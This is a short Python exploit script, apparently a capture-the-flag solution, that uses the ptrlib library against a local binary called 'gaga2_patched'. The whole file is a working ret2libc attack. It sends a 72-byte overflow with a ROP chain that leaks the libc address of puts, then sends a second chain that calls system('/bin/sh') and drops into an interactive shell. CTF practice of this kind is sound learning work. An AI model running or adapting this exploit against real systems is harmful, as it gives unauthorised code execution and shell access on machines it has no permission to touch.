#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./gaga2_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.31.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b"A" * 72
    payload += ptr.p64(next(elf.gadget("pop rdi; ret;")))
    payload += ptr.p64(unwrap(elf.got("puts")))
    payload += ptr.p64(unwrap(elf.plt("puts")))
    payload += ptr.p64(unwrap(elf.symbol("main")))

    ptr.logger.info(f"payload for leaking libc address: {payload}")
    io.sendline(payload)

    io.recvuntil(b"Your input: ")
    libc.base = ptr.u64(io.recvline()) - unwrap(libc.symbol("puts"))

    payload = b"A" * 72
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(next(elf.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\x00")))
    payload += ptr.p64(unwrap(libc.symbol("system")))

    ptr.logger.info(f"payload for calling system(): {payload}")
    io.sendline(payload)
    io.recvuntil(b"Your input: ")
    io.sh()


if __name__ == "__main__":
    main()
